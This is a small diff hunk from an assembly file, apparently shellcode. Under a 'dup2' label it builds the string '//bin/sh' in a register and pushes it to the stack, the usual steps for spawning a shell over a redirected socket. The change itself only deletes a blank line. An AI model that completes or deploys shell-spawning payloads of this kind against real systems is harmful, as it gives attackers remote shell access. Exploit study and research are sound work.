@@ -48,7 +48,6 @@ dup2:
     pop rsi
     pop rdx
     mov rdi,0x68732f6e69622f2f
-
     shr rdi,0x8
     push rdi
     push rsp
